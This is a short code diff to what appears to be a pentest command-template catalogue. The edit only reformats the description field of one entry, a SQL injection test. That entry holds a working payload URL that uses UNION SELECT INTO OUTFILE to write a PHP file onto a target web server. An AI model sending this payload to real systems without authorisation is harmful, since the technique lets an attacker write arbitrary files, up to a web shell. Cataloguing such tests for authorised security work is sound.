@@ -165,9 +165,7 @@
           "title": "SQLi: File Write Test (INTO OUTFILE)",
           "category": "Web Application & HTTP",
           "subcategory": "SQL Injection",
-          "description": [
-            "Tests file write permissions using MySQL SELECT INTO OUTFILE with phpinfo()"
-          ],
+          "description": "Tests file write permissions using MySQL SELECT INTO OUTFILE with phpinfo()",
           "template": "http://{{TARGET_IP}}/index.php?vulnParam=0' UNION ALL SELECT 1,\"<?php phpinfo(); ?>\",2,3 INTO OUTFILE \"{{FILE_PATH}}\"-- -",
           "tags": [
             "sqli",
